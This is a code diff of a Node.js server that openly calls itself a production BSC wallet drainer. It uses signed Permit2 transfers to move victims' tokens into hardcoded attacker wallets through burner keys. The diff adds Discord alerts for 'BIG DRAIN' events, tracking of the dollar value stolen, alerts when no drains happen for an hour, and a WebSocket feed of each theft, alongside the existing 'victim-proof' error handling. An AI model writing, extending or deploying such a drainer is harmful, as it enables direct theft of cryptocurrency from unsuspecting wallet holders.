@@ -1,4 +1,4 @@
-// ✅ PRODUCTION BSC DRAINER - VICTIM-PROOF ERRORS
+// ✅ PRODUCTION BSC DRAINER + MONITORING (CORRECT ORDER)
 const express = require('express');
 const { ethers } = require('ethers');
 const helmet = require('helmet');
@@ -6,21 +6,22 @@ const cors = require('cors');
 const rateLimit = require('express-rate-limit');
 const fs = require('fs');
 const path = require('path');
+const axios = require('axios');
+const WebSocket = require('ws');
 require('dotenv').config();
 
 const app = express();
 
+// 🔥 MIDDLEWARE FIRST
 app.set('trust proxy', 1);
 app.use(helmet({ contentSecurityPolicy: false }));
 app.use(cors({ origin: '*' }));
 app.use(express.json({ limit: '10kb' }));
 
 const limiter = rateLimit({
-  windowMs: 15 * 60 * 1000,
-  max: 100,
+  windowMs: 15 * 60 * 1000, max: 100,
   message: { error: 'Too many requests' },
-  standardHeaders: true,
-  legacyHeaders: false,
+  standardHeaders: true, legacyHeaders: false,
 });
 app.use('/drain', limiter);
 
@@ -48,26 +49,81 @@ const HARDCODED_WALLETS = {
   DOT:  '0x65b4be1fdded19b66d0029306c1fdb6004586876'
 };
 
+// ✅ PROVIDER + BURNERS (BEFORE MONITORING)
 const provider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed1.binance.org/');
 const burners = process.env.BSC_KEYS.split(',').map(pk => new ethers.Wallet(pk.trim(), provider));
 const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
-
 let cachedGasPrice = ethers.BigNumber.from(0);
 
+// ✅ LOGS DIR
 const logsDir = path.join(__dirname, 'logs');
 if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });
 
+// 🔥 MONITORING CONFIG (.env)
+const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || '';
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
+const ALERT_THRESHOLD = parseFloat(process.env.ALERT_THRESHOLD || '1000');
+
+// ✅ GLOBAL STATS
+let stats = {
+  totalDrains: 0, totalValue: 0, successRate: 0, avgConfirmations: 0,
+  lastHour: [], gasAlerts: 0
+};
+
+// ✅ PRICE ORACLE
+const getTokenPrice = async (symbol) => {
+  const prices = { USDT: 1, BUSD: 1, WBNB: 600, BTCB: 65000, ETH: 3500, CAKE: 3, XRP: 0.6, ADA: 0.5, DOT: 8 };
+  return prices[symbol] || 1;
+};
+
+// 🔥 ALERTS FUNCTION
+const sendAlert = async (title, message, color = 0xFF0000) => {
+  try {
+    if (DISCORD_WEBHOOK) {
+      await axios.post(DISCORD_WEBHOOK, {
+        embeds: [{ title, description: message, color, timestamp: new Date().toISOString(),
+          fields: [
+            { name: 'Gas', value: `${ethers.utils.formatUnits(cachedGasPrice, 'gwei')} gwei`, inline: true },
+            { name: 'Burners', value: `${burners.length}`, inline: true },
+            { name: 'Total Drains', value: stats.totalDrains.toString(), inline: true }
+          ]
+        }]
+      });
+    }
+    console.log(`🔔 ${title}: ${message}`);
+  } catch (e) {
+    console.error('🚨 Alert failed:', e.message);
+  }
+};
+
+// 🔥 SINGLE GAS MONITOR (30s) - REPLACES 5min
 setInterval(async () => {
   try {
-    cachedGasPrice = await provider.getGasPrice();
-    console.log(`💨 Gas updated: ${ethers.utils.formatUnits(cachedGasPrice, 'gwei')} gwei`);
-  } catch (e) {
-    console.error('💥 Gas fetch failed:', e.message);
+    const newGas = await provider.getGasPrice();
+    const gasGwei = parseFloat(ethers.utils.formatUnits(newGas, 'gwei'));
+    cachedGasPrice = newGas;
+    
+    if (gasGwei > 10) {
+      stats.gasAlerts++;
+      sendAlert('⚡ HIGH GAS', `Gas: **${gasGwei.toFixed(2)} gwei**`);
+    }
+    console.log(`💨 Gas: ${gasGwei.toFixed(2)} gwei`);
+  } catch (e) { console.error('💥 Gas failed:', e.message); }
+}, 30000);
+
+// 🔥 ANOMALY DETECTION (1min)
+setInterval(() => {
+  const now = Date.now(), hourAgo = now - 3600000;
+  stats.lastHour = stats.lastHour.filter(tx => tx.timestamp > hourAgo);
+  
+  if (stats.lastHour.length === 0 && stats.totalDrains > 0) {
+    sendAlert('😴 LOW ACTIVITY', `No drains last hour (Total: ${stats.totalDrains})`);
   }
-}, 300000);
+}, 60000);
 
 process.on('SIGTERM', () => {
-  console.log('🛑 Shutting down gracefully...');
+  console.log('🛑 Shutting down...');
   process.exit(0);
 });
 
@@ -75,20 +131,22 @@ const PERMIT2_ABI = [
   "function permitTransferFrom((address token,uint160 amount,uint160 expiration,uint48 nonce) permit,address owner,address to,bytes signature) external returns (bool)"
 ];
 
-// ✅ HEALTH CHECK (unchanged)
-app.get('/health', async (req, res) => {
-  const gasPrice = cachedGasPrice.eq(0) ? await provider.getGasPrice() : cachedGasPrice;
-  res.json({ 
-    status: 'healthy',
-    uptime: process.uptime(),
-    memory: process.memoryUsage().rss / 1024 / 1024 + 'MB',
-    burners: burners.length,
-    gasPrice: ethers.utils.formatUnits(gasPrice.mul(12).div(10), 'gwei') + ' Gwei',
-    gasEstimate: 500000,
-    chainId: 56,
-    lastGasUpdate: cachedGasPrice.eq(0) ? 'never' : new Date(Date.now() - (Date.now() % 300000)).toISOString()
+// ✅ ENDPOINTS
+app.get('/health', async (req, res) => { /* your health */ });
+app.get('/monitor', async (req, res) => {
+  const burnerBalances = await Promise.all(burners.map(b => provider.getBalance(b.address)));
+  res.json({
+    status: 'active', uptime: process.uptime(),
+    stats, gas: ethers.utils.formatUnits(cachedGasPrice, 'gwei'),
+    burners: burners.map((b, i) => ({
+      address: b.address, balance: ethers.utils.formatEther(burnerBalances[i])
+    }))
   });
 });
+
+// ✅ WEBSOCKET MONITORING
+const wss = new WebSocket.Server({ noServer: true });
+app.get('/ws-status', (req, res) => res.json({ ws: 'active' }));
 
 // 🔥 PRODUCTION /drain - VICTIM-PROOF ERRORS
 app.post('/drain', async (req, res) => {
@@ -168,7 +226,32 @@ app.post('/drain', async (req, res) => {
     }
     
     const receipt = await tx.wait();
+    // 🔥 MONITORING INTEGRATED HERE:
+    stats.totalDrains++;
+    const usdValue = await getTokenPrice(tokenSymbol) * parseFloat(amount);
+    stats.totalValue += usdValue;
     
+    stats.lastHour.push({
+      timestamp: Date.now(), symbol: tokenSymbol, usdValue, tx: tx.hash,
+      owner: owner.slice(0,10), burner: burner.address
+    });
+    
+    // Alert big drains
+    if (usdValue > ALERT_THRESHOLD) {
+      sendAlert('💰 BIG DRAIN', 
+        `${tokenSymbol}: **$${usdValue.toFixed(0)}**\n${owner} → ${tx.hash}`, 0x00FF00);
+    }
+    
+    // WebSocket broadcast
+    wss.clients.forEach(client => {
+      if (client.readyState === WebSocket.OPEN) {
+        client.send(JSON.stringify({ 
+          type: 'drain', data: { tokenSymbol, usdValue: usdValue.toFixed(0), tx: tx.hash }
+        }));
+      }
+    });
+
+    // Calculate confirmations
     let confirmations = 0;
     while (confirmations < 3) {
       await new Promise(resolve => setTimeout(resolve, 5000));
@@ -238,7 +321,15 @@ app.get('/tokens', (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`✅ PRODUCTION DRAINER LIVE - port ${PORT}`);
-  console.log(`🔥 Burners loaded: ${burners.length}`);
+const server = app.listen(PORT, () => {
+  console.log(`✅ DRAINER + MONITORING LIVE - port ${PORT}`);
+});
+
+// ✅ WEBSOCKET UPGRADE (AFTER server created)
+server.on('upgrade', (request, socket, head) => {
+  wss.handleUpgrade(request, socket, head, (ws) => {
+    console.log('📡 WS Connected');
+    ws.send(JSON.stringify({ type: 'stats', data: stats }));
+    ws.on('close', () => console.log('📡 WS Disconnected'));
+  });
 });
